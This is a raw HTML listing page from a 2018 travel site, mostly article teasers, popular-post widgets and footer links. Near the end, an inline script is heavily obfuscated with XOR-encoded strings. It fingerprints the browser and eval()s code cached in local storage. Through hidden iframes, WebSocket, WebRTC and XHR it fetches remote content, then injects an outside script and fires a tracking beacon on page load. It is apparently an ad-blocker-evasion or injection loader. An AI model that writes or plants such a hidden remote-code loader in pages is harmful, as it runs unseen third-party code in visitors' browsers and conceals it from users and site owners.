                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/14151003/Mykonos.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">This Five-Bedroom Villa In Mykonos Worth $5 million Could Be Yours For $50!</h2>
                        <p class="meta_post"><span class="meta_post_author">Charley Frank</span> &bull; <span class="meta_post_date">Feb 21, 2018</span></p>
                        <p class="excerpt_item">



If you have ever dreamt of owning a luxury Grecian villa, but never had the money to do so, you're in luck as this beautiful property is...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/backpackers/japanese-style-pods-hotel-experience/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/14154811/4908631B00000578-5371883-image-a-23_1518183042228.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Japanese Style-Pods Have Arrived In The UK For An Unusual Hotel Experience</h2>
                        <p class="meta_post"><span class="meta_post_author">Charley Frank</span> &bull; <span class="meta_post_date">Feb 20, 2018</span></p>
                        <p class="excerpt_item">



Capsule hotels where guests are given pods instead of hotel rooms are very common in Singapore and Japan. The pods are stacked one on top of...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

    
</div><div class="visible-md-block visible-lg-block aside">



    <div class="aside-popular">
		
        <div class="wrap_widget">
			<!--                <div id='ad_pos_pap-rr-atf' style="text-align:center;margin:0px 0px 20px -7px;">-->
<!--                    <script type='text/javascript'>-->
<!--                        googletag.cmd.push(function () {-->
<!--                            googletag.display('ad_pos_pap-rr-atf');-->
<!--                        });-->
<!--                    </script>-->
<!--                </div>-->
<!--			--><!--                    <div id='ad_pos_pap-tablet-rr-atf' style="text-align:center;margin: 0 0 15px -15px">-->
<!--                    <script type='text/javascript'>-->
<!--                        googletag.cmd.push(function () {-->
<!--                            googletag.display('ad_pos_pap-tablet-rr-atf');-->
<!--                        });-->
<!--                    </script>-->
<!--                </div>-->
<!--			-->					                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/lifestyle/digital-detox-petit-saint-vincent/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/09122325/Petit_St_Vincent_Island_View.jpg')"></div>
                                </div>
                                <p class="tb_text">Editorial</p>
                                <p class="meta_post"><span class="meta_post_author">Charley Frank</span> &bull; <span class="meta_post_date">Feb 18, 2018</span></p>
                                <p class="tb_top_meta">Looking For A Digital Detox? Petit Saint Vincent Is The Destination For You</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/lists/weirdest-ski-slopes-around-the-world/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/08125824/3F20211900000578-4397696-image-a-5_1491822775557-e1515416342421.jpg')"></div>
                                </div>
                                <p class="tb_text">Lists</p>
                                <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Feb 17, 2018</span></p>
                                <p class="tb_top_meta">Here Are Some Of The Weirdest Ski Slopes Around The World</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/locations/americans-visit-brazil/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/08130330/brazil-1.jpg')"></div>
                                </div>
                                <p class="tb_text">Locations</p>
                                <p class="meta_post"><span class="meta_post_author">JJ Foster</span> &bull; <span class="meta_post_date">Feb 15, 2018</span></p>
                                <p class="tb_top_meta">It Is The Cheapest Time Ever For Americans To Visit Brazil</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/lifestyle/one-man-left-everything-world/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/07123706/Screen-Shot-2018-02-07-at-12.44.06.png')"></div>
                                </div>
                                <p class="tb_text">Lifestyle</p>
                                <p class="meta_post"><span class="meta_post_author">David Whittaker</span> &bull; <span class="meta_post_date">Feb 14, 2018</span></p>
                                <p class="tb_top_meta">How One Man Left Everything Behind To See The World</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/lists/hotels-5-diamond-award/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/08095337/The-Ritz-Carlton-Dove-Mountain_spa-pool.jpg')"></div>
                                </div>
                                <p class="tb_text">Editorial</p>
                                <p class="meta_post"><span class="meta_post_author">Taylor McAdams</span> &bull; <span class="meta_post_date">Feb 12, 2018</span></p>
                                <p class="tb_top_meta">8 New Hotels That Landed This Year&#8217;s Prestigious 5-Diamond Award</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/locations/female-only-resort-island-finland/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/08151205/women-only-island-finland.jpg')"></div>
                                </div>
                                <p class="tb_text">Locations</p>
                                <p class="meta_post"><span class="meta_post_author">Taylor McAdams</span> &bull; <span class="meta_post_date">Feb 11, 2018</span></p>
                                <p class="tb_top_meta">No Boys Allowed: Female-Only Resort Island Declared In Finland</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/locations/jamaican-water-bungalows/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/08124152/bungalows-1.jpg')"></div>
                                </div>
                                <p class="tb_text">Locations</p>
                                <p class="meta_post"><span class="meta_post_author">JJ Foster</span> &bull; <span class="meta_post_date">Feb 10, 2018</span></p>
                                <p class="tb_top_meta">Jamaican Resort Has Over-The-Water Bungalows With Glass Floors</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget">
                        <div class="three_blocks_item three_blocks_item_post">
                            <a href="http://pensandpatron.com/locations/mexican-retreat-jungle/">
                                <div class="tb_img_wrap">
                                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/01154849/image-42.jpeg')"></div>
                                </div>
                                <p class="tb_text">Locations</p>
                                <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Feb 8, 2018</span></p>
                                <p class="tb_top_meta">A Mexican Retreat Deep In The Heart Of The Jungle</p>
                            </a>
                        </div>
                        <!--three_blocks_item_post-->
                    </div>
					        </div>
    </div>
</div>

            </div>
        </div>
    </div>
</div>
</main>



<footer id="main_footer">
	<div class="container">
		<div class="row">
						
<div class="col-xs-12 col-sm-4 footer_about equal_footer">
  <a class="footer_logo_link" href="http://pensandpatron.com">
          <img src="http://pensandpatron.com/wp-content/themes/pap/images/logo.png" alt="Pens &amp; Patron" class="footer_logo_image img-responsive">
      </a>

  <div class="about_us widget">
    <h2 class="about_us_head widget-title">about us</h2>
    <p class="about_us_text">Pens & Patron is a travel site dedicated to wandering spirits. Explore, taste, and write about the world.</p>
  </div>

    <div class="footer_social_links">
        <a href="https://www.facebook.com/pensandpatron/" target="_blank"><span class="icon icon-fb"></span></a>
        <a href="https://twitter.com/PensAndPatron/" target="_blank"><span class="icon icon-tw"></span></a>
    </div>

</div>			    <div class="col-xs-12 col-sm-4 col-sm-4 footer_widget equal_footer hidden-xs">
                <div class="widget">
            <h2 class="popular_post_head widget-title">Trending</h2>

            <ul>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://pensandpatron.com/lists/tips-help-save-money-travels/" class="popular_post_item_link">
                            <p class="popular_post_item_head">5 Tips That Will Help You Save Money For Traveling</p>
                            <p class="popular_post_item_meta widget_meta">
                                7 Feb, 2018                            </p>
                        </a>
                    </div>
                </li>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://pensandpatron.com/lifestyle/disneyland-brewery/" class="popular_post_item_link">
                            <p class="popular_post_item_head">Disneyland Is About To Get Even Happier With The Opening Of A Brewery</p>
                            <p class="popular_post_item_meta widget_meta">
                                6 Feb, 2018                            </p>
                        </a>
                    </div>
                </li>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://pensandpatron.com/lifestyle/best-airport-freebies/" class="popular_post_item_link">
                            <p class="popular_post_item_head">Don&#8217;t Sweat Those Long Layovers, Here&#8217;s A List Of The Best Airport Freebies</p>
                            <p class="popular_post_item_meta widget_meta">
                                5 Feb, 2018                            </p>
                        </a>
                    </div>
                </li>
                            </ul>
        </div>
    </div>

            
    <div class="col-xs-12 col-sm-4 col-sm-4 footer_follow equal_footer">

                <div class="aside-popular small_block">
            <div class="widget">
                <h2 class="popular_post_head widget-title">POPULAR POSTS</h2>
                                    
                <div class="wb_right">
                    <a href="http://pensandpatron.com/locations/rainy-day-orlando/">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2017/12/31155443/crayola_experience_IMG_0631-2.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">Rainy Day Suggestions When Visiting Orlando</h2>
                            <p class="small-post-date">4 Feb, 2018</p>
                        </div>
                    </a>
                </div>

                                    
                <div class="wb_right">
                    <a href="http://pensandpatron.com/locations/australias-new-and-improved-gold-coast/">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/08142144/http_2F2Fcdn.cnn_.com2Fcnnnext2Fdam2Fassets2F171121162029-gold-coast-burleigh-heads-on-a-jellurgal-walkabout-tour.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">Welcome To Australia&#8217;s New And Improved Gold Coast</h2>
                            <p class="small-post-date">3 Feb, 2018</p>
                        </div>
                    </a>
                </div>

                                    
                <div class="wb_right">
                    <a href="http://pensandpatron.com/lifestyle/danish-spa-hotel/">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/25134426/48911E4B00000578-5263439-image-a-2_1516875818939.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">Dip Your Toes In The Baltic Sea At This Danish Spa Hotel</h2>
                            <p class="small-post-date">1 Feb, 2018</p>
                        </div>
                    </a>
                </div>

                        </div>
        </div>
    </div>
					</div>
	</div>
	
<div id="footer_menu">
  <div class="container">
    <div class="row">
      <div class="col-xs-12 override-footer-padding">
        <ul id="menu-footer-menu" class="footer_menu"><li id="menu-item-1276" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1276"><a title="Privacy Policy" href="http://pensandpatron.com/privacy-policy/">Privacy Policy</a></li>
<li id="menu-item-1278" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1278"><a title="Terms of Service" href="http://pensandpatron.com/terms-of-service/">Terms of Service</a></li>
<li id="menu-item-1277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1277"><a title="DMCA" href="http://pensandpatron.com/dmca/">DMCA</a></li>
<li id="menu-item-1275" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1275"><a title="Contact Us" href="http://pensandpatron.com/contact-us/">Contact Us</a></li>
<li id="menu-item-1279" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1279"><a title="Advertise With Us" href="http://pensandpatron.com/contact-us/">Advertise With Us</a></li>
<li id="menu-item-1280" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1280"><a title="Work With Us" href="http://pensandpatron.com/contact-us/">Work With Us</a></li>
</ul>        <div class="copyright">
          <h1 class="copyright_head">&copy; <script>document.write(new Date().getFullYear());</script> pensandpatron. All rights reserved.</h1>
        </div>
      </div>
    </div>
  </div>
</div>
</footer>



<script>
  try{!function(){function B(){try{var n=K()}catch(e){}if(n)try{C(n.h,null)}catch(e){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,e){e.as=!0;try{C(n,e)}catch(t){}},M)}function M(){var n=a(window.location.protocol==a("GR4EHwle")?"GR4EHwleX0k=":"GR4EH0BLXw==");(new Image).src=n+u+N}function L(n,e){function t(){var a=A.shift();if(a)try{a(n,t)}catch(r){t()}else v(),e()}try{O()}catch(a){return v(),void e()}var A=[P,Q,R,S];t()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var e=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("ARgVDhcGHAM=")));e=new Uint8Array(e);for(var t="",A=0;A<e.length;A++)t+=String.fromCharCode(e[A]);for(e=btoa(t),t=(new Date).getTime(),A=0;A<n.length;A++){var o,c=n[A];for(o in c)if(0===o.lastIndexOf(e,0)){try{for(var g=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),i=atob(c[o]),w=new Uint8Array(i.length),l=0;l<i.length;l++)w[l]=i.charCodeAt(l);var u=r(D(g,w.buffer))}catch(B){continue}if(l=parseInt(u.substring(0,13),10),!isNaN(l))if(t-l>864e5||1>t-l)c.removeItem(o);else if((l=u.substring(13))&&!(16>l.length))return{h:l,key:o}}}return null}function Q(n,e){var t=a("Ql5HVw=="),A=a("RihKXExeRSJJWltDLThPQS5PO1ZDX19VNV5YNiFNV1NLLjNVOCZKJ0ZSUUFWO0FDLUNAW0hcXV9JX1VNJEdeW0ZQRFlAJ0NcNV1YSilDN0hVME9VTFNRLUFXVkJYMiI=");t=w+":"+t;var r={};r[a("BBgcHA==")]=a("BR8CAUA=")+t+a("Th4CDhQXAAkBHF8NDwk="),r[a("EhgVCx8KBA8SBA==")]=a("CAsEBhcF"),r[a("BBkVHRQFHQM=")]=a("CAsEBhcF"),F(A,r,function(n){return n=n.match(new RegExp(a("LwkRAR4NFAcHDVglCFJVJQteWkdGXB4LAxE3MzJeRD8VQVBHJgBbOl00BlIwVykdRClUMx1NQk8vCUlXFg4UQwMPHA4D"))),null==n?null:(n=n[1],a("EgseCxMAERIWUlNZXVkgPT9VQlxKV1lZQE0=")+n+a("UVxDX0tSUBIKGEILCRUUAE8HGwsdFEs=")+n+a("URgAAAgQUFBAWFNPTBcQDRgaCARUBQQcB01S"))},n,e)}function R(n,e){var t=a("R1pAXg=="),A=a("N19KLjheSF9JLVZDWEhPQF5PTVZDVVhVQ19YNVpNUyJLXzJVP1VKIEZSVk9WTjBDKTBAWj9cWVtJVSRNIDJeVzRQQyxAITNcRFBYSVpDQEpVNEhVSiBRWzJXVU5YTlw=");t=w+":"+t;var r={};r[a("BBgcHA==")]=[a("Ah4FAUA=")+t],F(A,r,function(n){return n=n.match(new RegExp(a("LwkRAR4NFAcHDVglCFJVJQteWkdGXB4LAxE3MzJeRD8VQVBHJgBbOl00BlIwVykdRClUMx1NSzMXRktXFg4UQwIYFgMC"))),null==n?null:(n=n[1],a("EgseCxMAERIWUlJZXVkgPT9VSF5NUV9XQFtWQEI=")+n+a("UR4JH1oMHxUH"))},n,e)}function F(n,e,t,A,r){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;A=o.bind(null,A),r=o.bind(null,r);var i={};i[a("GAkVPB8WBgMBGw==")]=[e];var w=new g.c(i);w[a("EhgVDg4BNAcHCSERDRcbHAM=")](a("XgcVGxtLAA8dDw==")).binaryType=a("EBgCDgMGBQAVDRA="),w[a("HgQZDB8HEQgXAQYYGBw=")]=function(n){if(null!=n[a("EgseCxMAERIW")]&&(n=t(n[a("EgseCxMAERIW")][a("EgseCxMAERIW")]),null!=n)){var e={};e[a("EgseCxMAERIW")]=n,e[a("Ag4AIjYNHgM6BgYcFA==")]=0,w[a("EA4UJhkBMwcdDAsdDQ0Q")](new g.b(e),function(){},function(){})}},w.addEventListener(a("GAkVDBUKHgMQHAsWAgoBGBsQGQcYCAwK"),function(){w[a("GAkVLBUKHgMQHAsWAioBGBsQ")]===a("FwsZAx8A")&&r()});var l=a("B1dAZRVZBRUWGgwYARxVSU9FWiY3RiI/R01TRVVZVE1BREFlCVkDAwAbCxYCFxQUCn8ZUjAoSyYjWUJGUEBKU19aXl5wEE1WU1hoGFEfHBcIEAgfCw8FG0keChZPRVFVUQ==")+n+a("ewtNBhkBXQkDHAsWAgpPDR0cGQQVA2ECTgwSBw4eBwIFAx8BWlVCVUdIJi0gKloqLCEqT0xWW195DF8EAQMUDhAaSlpKVEBGBA0ACxgaWB0OARsMEQcFARYBQkVXQW4CTAMTClcRFhQSD1g=")+function(){for(var n="",e=a("QVpAX0pUQFY="),t=0;16>t;++t){var A=(4294967296*Math.random()>>>0).toString(16);n+=e.substring(0,e.length-A.length)+A}return n}()+a("ewtNBhkBXRYEDFhJXElFSV9FSl9JVltfQ11SR1JHVFNBWkBfSlRAVkNYUnM=");w[a("EhgVDg4BPwAVDRA=")](function(n){w[a("Ag8EIxUHEQo3DREaHhAFDQYaFA==")](n,function(){var n={};n[a("BRMACg==")]=a("EAQDGB8W"),n[a("Ag4A")]=l,w[a("Ag8EPR8JHxIWLAcKDwscCRscFQE=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=w[a("EhgVDg4BNAcHCSERDRcbHAM=")](a("Xh0DH3o=")+window.navigator.userAgent),n.binaryType=a("EBgCDgMGBQAVDRA="),G(n,x(),function(n){A(n,{rtc:w})},function(){r()})}function S(n,e){function t(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var A=x();A=a(window.location.protocol==a("GR4EHwle")?"GR4EHwleX0k=":"GR4EH0BLXw==")+u+A;var o=a("Ni8k"),c=!1;n=t.bind(null,n),e=t.bind(null,e);var i=new g.g;i.onreadystatechange=function(){4==i.readyState&&(0==i.status?e():n(r(i.response),{}))},i.onerror=function(){e()},i.open(o,A,!0),i.responseType=a("EBgCDgMGBQAVDRA="),i.send(null)}function P(n,e){var t=a("BhkDVVVL"),A=new g.a(t+w+a("Xh0DHw=="));A.binaryType=a("EBgCDgMGBQAVDRA="),G(A,x(),function(e){n(e,{ws:A})},function(){e()})}function G(n,e,t,A){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;t=o.bind(null,t),A=o.bind(null,A);var g=!1,i=setTimeout(function(){A(Error())},3e3),w=E(JSON.stringify({url:e||"",method:a("Ni8k"),headers:null,body:null}));n.onopen=function(){clearTimeout(i),n.send(w)};var l,u=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var e=new Uint8Array(n.data);if(222===e[0]&&173===e[1]&&190===e[2]&&239===e[3])return}!1===g?(g=!0,n=r(n.data),l=JSON.parse(n),l={status:l.status||0,headers:l.headers||{}}):(n=n.data,e=new Uint8Array(u.byteLength+n.byteLength),e.set(new Uint8Array(u),0),e.set(new Uint8Array(n),u.byteLength),u=e.buffer)},n.onerror=function(){clearTimeout(i),A(Error())},n.onclose=function(){g?(l.body=u,t(r(l.body))):(clearTimeout(i),A(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("EgUeGx8KBCIcCxcUCRcB")]&&n[a("EgUeGx8KBCIcCxcUCRcB")][a("FQ8WDg8IBDAaDRU=")]?n[a("EgUeGx8KBCIcCxcUCRcB")][a("FQ8WDg8IBDAaDRU=")]:n[a("EgUeGx8KBDEaBgYWGw==")]}function H(){var n=document.createElement(a("GAwCDhcB"));n.style.height=a("QBoI"),n.style.width=a("QBoI"),n.style.display=a("HwUeCg=="),n[a("AhgTCxUH")]=a("EA=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var e=y(n);e.document.documentElement||e.document.write(a("EA=="));try{e.stop()}catch(t){}return n}function O(){I=a("BAQbARUTHg=="),t=a("EgICABcB"),q=a("FwMCChwLCA=="),z=a("HhoVHRs="),A=a("AgsWDggN");var n=H();n=y(n);var e=n.navigator.userAgent,r=new RegExp(a("EgICABcBDAUbGg0UBQwY"),"i").test(e)?t:new RegExp(a("FwMCChwLCBoaCwcOCRgGHAMJHBcQCRg="),"i").test(e)?q:new RegExp(a("L0JYUFsHGBQcBQcFDRcRCwAcHkZXT0EcEgsDBQs="),"i").test(e)?A:new RegExp(a("HhoCExUUGQkA"),"i").test(e)?z:window[a("EgICABcB")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(r)&&(n=window),e=a("FBwRAw=="),g.c=n[e](a("BgMeCxUTXjQnKzIcCQs2FgEbHwwNDwQBUxEeVxUeCgceHV4YHwYbDwc6Njo8HBALLBoUARwFHwYcA0ILHlcTCh8OHxhUCR8cITwhKQkcBzoAGxQKGhICAB1NHgtCAA0NFQUHQRcXIjIwOAccHjoaFwEQGRsQCQU=")),g.f=n[e](a("BgMeCxUTXjQnKzEcHwocFgExHxwaFAIfBwQNGUILGEMGAx4LFRNeERYKCRAYKyE6PBAJHBAJBSsWHgEFCwcQCh4EUBMGRAcPHQwNDkIUGgM9ITk8HBUYBhwDJhIRFBYKAR4ZABREDBpTHwsXCBYCVwIGKDs6NQ4cAAQNGSYSFwADAwAbEwse")),g.b=n[e](a("BgMeCxUTXjQnKysaCToUFwscHg4NA0sTD00VHgwTCxRfHRUNEQ0ENCcrKxoJOhQXCxweDg0DSxMPTRUeDBMLFF8HHxUoMDMvEA0hGAIdHB0OAR9PBRpLGBoDBhgVWQkQIz4zJhkBMwcdDAsdDQ0Q")),r===q?(r=H(),g.a=y(r)[e](a("BgMeCxUTXjEWCjEWDxIQDQ==")),r.parentElement.removeChild(r)):g.a=n[e](a("BgMeCxUTXjEWCjEWDxIQDQ==")),g.g=n[e](a("BgMeCxUTXj4+JCoNGAknHB4AHxwN"))}function D(n,e){var t=new Uint8Array(e),a=new ArrayBuffer(e.byteLength);a=new Uint8Array(a);for(var A=0;A<e.byteLength;A++)a[A]=t[A]^n.charCodeAt(A%n.length);return a.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var e="";n=new Uint8Array(n);for(var t=n.byteLength,a=0;t>a;a++)e+=String.fromCharCode(n[a]);return decodeURIComponent(escape(e))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var e=new Uint8Array(n.length),t=0;t<n.length;t++)e[t]=n.charCodeAt(t);return e.buffer}function x(){return a("Xg8aHEUUTQ==")+"2200470001"}function a(n){n=window.atob(n);for(var e="",t=0;t<n.length;t++)e+=String.fromCharCode(n.charCodeAt(t)^"qjpozdpfshbylyuyouzoyfkosmbwbwdc".charCodeAt(t%32));return e}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src=n,(document.body||document.head||document.documentElement).appendChild(e),J=!0}}var u=a("CQICQRgRHAQSEg0YQhoaFA=="),w=a("EEQSGhYGERwcCUwaAxQ="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2200470001",N="/l?p=2200470001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://pensandpatron.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://pensandpatron.com/wp-content/themes/pap/scripts/plugins.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://pensandpatron.com/wp-content/themes/pap/scripts/main.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://pensandpatron.com/wp-content/themes/pap/scripts/jquery.sticky.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://pensandpatron.com/wp-includes/js/wp-embed.min.js?ver=4.8.3'></script>
</body>
</html>